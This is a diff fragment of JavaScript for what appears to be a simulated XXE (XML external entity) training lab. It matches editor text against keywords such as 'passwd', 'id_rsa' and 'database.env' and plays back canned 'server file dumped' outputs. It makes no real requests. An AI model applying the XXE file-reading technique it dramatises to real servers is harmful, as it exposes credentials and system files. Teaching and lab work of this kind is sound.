+    logText.textContent = `HTTP/1.1 200 OK — Normal XML processed without entity expansions.`;
+    heartbeatText.textContent = "libxml2 engine active · DTD Entity Resolution: ENABLED";
+  } else {
+    banner.className = "alert-banner alert-leaked";
+    bannerIcon.textContent = "🚨";
+    bannerText.textContent = `CRITICAL XXE LEAK: Entity &xxe; dereferenced ${p.target}! Server file dumped!`;
+    logBox.style.color = "#f87171";
+    logText.textContent = `🚨 XXE SUCCESS: Server read host file ${p.target} and reflected content in notes!`;
+    heartbeatText.textContent = `⚠️ DTD RESOLVED: SYSTEM "${p.target}" dereferenced to memory buffer!`;
+  }
+
+  // Typewriter effect into terminal box
+  const termOut = document.getElementById('term-output');
+  termOut.textContent = '';
+  if (typeTimer) clearInterval(typeTimer);
+
+  const textToType = p.content;
+  let charIdx = 0;
+  const stepSize = Math.max(1, Math.floor(textToType.length / 40));
+
+  typeTimer = setInterval(() => {
+    if (charIdx >= textToType.length) {
+      termOut.textContent = textToType;
+      clearInterval(typeTimer);
+      return;
+    }
+    charIdx += stepSize;
+    termOut.textContent = textToType.substring(0, charIdx);
+  }, 20);
+}
+
+function fireXxePayload() {
+  const editorVal = document.getElementById('xml-editor').value;
+  if (editorVal.includes('database.env')) {
+    selectPreset('db');
+  } else if (editorVal.includes('id_rsa')) {
+    selectPreset('ssh');
+  } else if (editorVal.includes('passwd') || editorVal.includes('ENTITY')) {
+    selectPreset('passwd');
+  } else {
+    selectPreset('legit');
+  }
+}
+
+function resetLab() {
+  selectPreset('legit');
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  selectPreset('legit');
+});
+</script>
+</body>
+</html>
